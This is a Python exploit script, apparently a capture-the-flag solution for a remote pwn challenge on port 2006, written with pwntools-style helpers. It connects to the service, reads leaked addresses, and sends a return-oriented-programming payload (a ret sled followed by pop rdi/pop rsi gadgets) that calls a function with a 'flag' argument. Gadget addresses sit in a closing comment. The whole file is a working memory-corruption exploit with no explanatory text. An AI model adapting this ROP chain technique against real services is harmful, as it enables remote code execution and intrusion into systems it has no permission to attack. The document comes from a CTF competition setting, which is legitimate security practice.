#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
__MODE__ = 'PWN'
from rootkit import *

# Set up pwntools for the correct architecture
host = args.HOST or 'challs.xmas.htsp.ro'
port = int(args.PORT or 2006)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = remote(host, port)
sleep(2)
a=re()
magic,flag,cat,pop_rdi=GetInt(a)
pop_rsi=pop_rdi-2
ret=pop_rdi+1
payload=p64(ret)*100+p64(pop_rsi)+p64(flag)+p64(flag)+p64(pop_rdi)+p64(cat)+p64(magic)
sl(payload)
print(re().decode('utf-8'))
io.close()
"""
0x00000000400b31: pop rsi; r15 ret
0x00000000400b33: pop rdi; ret
0x00000000400b34: ret

"""